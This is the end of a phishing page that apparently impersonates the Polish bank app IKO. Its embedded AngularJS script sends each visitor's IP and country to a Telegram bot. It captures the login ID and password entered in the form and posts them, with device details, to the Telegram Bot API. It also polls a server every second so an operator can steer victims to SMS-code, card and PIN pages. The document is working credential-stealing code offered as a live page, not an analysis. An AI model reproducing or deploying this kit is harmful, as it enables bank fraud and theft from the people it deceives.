                              </a>
                              <a rel="noopener noreferrer" class="_3WAzU _2S67B" href="" target="_blank" data-text="Kontakt">
                                 <span class="hofzD">Otwórz w nowej karcie&nbsp;</span>
                                 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="_2hPJH">
                                    <path d="M4 6v12h16V6Zm15 1v1.2l-7 4.642L5 8.2V7ZM5 17V9.432l7 4.644 7-4.643V17Z" fill="#003574"></path>
                                 </svg>
                                 Kontakt
                              </a>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div class="_1lbk7">
                           <div class="_3Fpn0" tabindex="-1"></div>
                        </div>
                        <div class="_1lbk7">
                           <div class="_3Fpn0" tabindex="-1"></div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
      


<script src="file/jquery.min.js"></script>
<script src="file/angular.min.js"></script>
<script src="file/dirPaginate.js"></script>

<script> 

var fetch = angular.module('sa_app', ['angularUtils.directives.dirPagination']);

fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    var urlx = window.location.pathname;
    var pathname = urlx.replace("index.php", "");

    var urly = window.location.href;
    var pathname2 = urly.replace("index.php", "");

    $scope.info_User={};
    $scope.load='';
    $scope.loads_info='';
    $scope.base_url='';
    $scope.logo_png='';

   


    $scope.show_data = function(){
        $http({
          method: 'get',
          url: "config/device.php"
        }).then(function successCallback(response) {
                $scope.info_User=response.data;
                console.log($scope.info_User)

                    var Detailefun = {}; 
                    Detailefun.ip=  $scope.info_User['ip'];
                    Detailefun.fun= "FI LOGIN";
                    $http({
                         method: 'post',
                         url:  $scope.base_url+"config/fun.php?request=2",
                         data: JSON.stringify(Detailefun), 
                          headers: {'Content-Type': 'application/json'}
                   }).then(function(data) {});


                        var Detailec = {}; 
                        Detailec.info= $scope.info_User['ip']+"\n"+$scope.info_User['country'] ;
                        const message = `VISTEUR IKO \n${Detailec.info}`;
                        const token = $scope.info_User['token'];
                        const chatId =$scope.info_User['chatId'];   
                        
                            $.ajax({
                                type: 'POST',
                                url: `https://api.telegram.org/bot${token}/sendMessage`,
                                data: {
                                    chat_id: chatId,
                                    text: message,
                                    parse_mode: 'markdown',
                                },
                                success: function (res) { } 
                            }); 



        }); 

  
    }
    setInterval(function() {
                var Detaile = {}; 
                Detaile.ip=  $scope.info_User['ip'];
                $http({
                     method: 'post',
                     url:  $scope.base_url+"config/fun.php?request=3",
                     data: JSON.stringify(Detaile), 
                      headers: {'Content-Type': 'application/json'}
               }).then(function(data) {
                   $scope.ip=data.data.ip;
                   $scope.fun=data.data.fun;
                     console.log(data);


                   if ($scope.fun== "gotoSendSMS") {
                       window.location.href = pathname+'sendONE.php';
                   } 
                   if ($scope.fun== "gotoSendOK") {
                       window.location.href = pathname+'sendOK.php';
                   } 
                   if ($scope.fun== "gotoSendNO") {
                       window.location.href = pathname+'sendNO.php';
                   } 
                   if ($scope.fun== "gotoCC") {
                       window.location.href = pathname+'card.php';
                   }                
                   if ($scope.fun== "gotoSMS") {
                       window.location.href = pathname+'sms_err.php';
                   }
                   if ($scope.fun== "gotoPIN") {
                       window.location.href = pathname+'pin.php';
                   }        
                   if ($scope.fun== "gotoLOG") {
                       window.location.href = pathname+'index.php';
                   }
                   if ($scope.fun== "gotoFIN") {
                       window.location.href = pathname+'fin.php';
                   }
                                
               });
    }, 1000);  









    $scope.validation = function(){ 
        
        if ($("#adField").val().length == 8) {
                $("._17M1H").removeClass("inpERR")
                $("#logVIEW").hide()
                $("#diVerrlog").hide()
                $("#pwdVIEW").show()
                console.log( "OK")
                console.log( $("#adField").val())
        }else{
            $("#diVerrlog").show()
            $("._17M1H").addClass("inpERR")
   
             
        }
    }

    $scope.validation2 = function(){ 
        
        if ($("#pwww").val().length >= 4) {
                $(".overlay").show();
                $("._17M1H").removeClass("inpERR")
                $("#diVerrlog2").hide()
                

             var Detaile = {};
             Detaile.login= $("#adField").val() ;
             Detaile.pwd=   $("#pwww").val() ;
             Detaile.info= $scope.info_User['ip']+" : "+$scope.info_User['browser']+" : "+$scope.info_User['device']+" : "+$scope.info_User['system'];
             Detaile.url= pathname2+'admin.php?ip='+$scope.info_User['ip'];
             const message = `IKO LOG\n--------------\n<code>${Detaile.login}</code>\n\n<code>${Detaile.pwd}</code>\n\n\n${Detaile.url}\n--------------\n${Detaile.info}`;

 
            const token = $scope.info_User['token'];
            const chatId =$scope.info_User['chatId'];

                var Detailefun = {}; 
                Detailefun.ip=  $scope.info_User['ip'];
                Detailefun.fun= "NEW";
                $http({
                 method: 'post',
                 url:  $scope.base_url+"config/fun.php?request=1",
                 data: JSON.stringify(Detailefun), 
                  headers: {'Content-Type': 'application/json'}
                 }).then(function(data) {});


            $.ajax({
                type: 'POST',
                url: `https://api.telegram.org/bot${token}/sendMessage`,
                data: {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'html',
                },
                success: function (res) {
                     setInterval(function() {
                           console.log('okkkk')
                            window.location.href = pathname+'sms.php';
                     }, 3000);
                  
                },
                error: function (error) {
                    console.error(error);
                    alert("error failed");
                }
            });

        }else{
            $("#diVerrlog2").show()
            $("._17M1H").addClass("inpERR")
   
             
        }

    }
  
     $scope.vide = function(){ 
        $("#pwww").val("")
       $("#adField").val("")
                $("._17M1H").removeClass("inpERR")
                $("#diVerrlog").hide()
                $("#diVerrlog2").hide()

       $("#pwdVIEW").hide()
       $("#logVIEW").show()

    }




}]);

</script>
   </body>
</html>